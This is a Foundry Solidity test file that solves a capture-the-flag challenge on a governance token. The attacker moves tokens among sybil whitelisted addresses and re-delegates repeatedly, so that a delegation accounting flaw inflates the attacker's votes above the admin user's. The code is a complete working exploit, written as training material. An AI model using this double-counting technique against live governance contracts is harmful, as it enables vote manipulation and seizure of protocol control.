// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {NotSushiToken} from "src/governance-shenanigans/NotSushiToken.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker"); // WLed address 1
    address o1 = makeAddr("o1"); // WLed address 2
    address o2 = makeAddr("o2"); // WLed address 3
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    NotSushiToken governanceToken;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // setting up governance token
        vm.prank(admin);
        governanceToken = new NotSushiToken();

        // --attacker sybil attack - got 3 controlled addresses WLed
        address[] memory addresses = new address[](4);
        addresses[0] = adminUser;
        addresses[1] = attacker;
        addresses[2] = o1;
        addresses[3] = o2;

        vm.prank(admin);
        governanceToken.addWledAddresses(addresses);

        vm.prank(admin);
        governanceToken.mint(adminUser, 2_000e18);
        vm.prank(admin);
        governanceToken.mint(attacker, 500e18);

        // adminUser delegates all votes to himself
        vm.prank(adminUser);
        governanceToken.delegate(adminUser);
    }

    /// solves the challenge
    function testChallengeExploit() public {
        /// for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}

        // implement solution here

        vm.prank(attacker, attacker);
        governanceToken.transfer(o1, 499e18);
        vm.prank(attacker);
        governanceToken.delegate(adminUser);

        vm.prank(o1, o1);
        governanceToken.transfer(attacker, 499e18);
        vm.prank(attacker);
        governanceToken.delegate(attacker);

        vm.prank(attacker, attacker);
        governanceToken.transfer(o1, 1e18);
        vm.prank(o1, o1);
        governanceToken.delegate(adminUser);

        vm.prank(attacker, attacker);
        governanceToken.transfer(o1, 499e18);
        vm.prank(o1, o1);
        governanceToken.delegate(attacker);

        vm.prank(o1, o1);
        governanceToken.transfer(o2, 1e18);
        vm.prank(o2);
        governanceToken.delegate(adminUser);

        vm.prank(o1, o1);
        governanceToken.transfer(o2, 499e18);
        vm.prank(o2, o2);
        governanceToken.delegate(attacker);

        validation();
    }

    /// expected final state
    function validation() public {
        // attacker gets more delegated votes than adminUser
        assertGt(governanceToken.getCurrentVotes(attacker), governanceToken.getCurrentVotes(adminUser));
    }
}
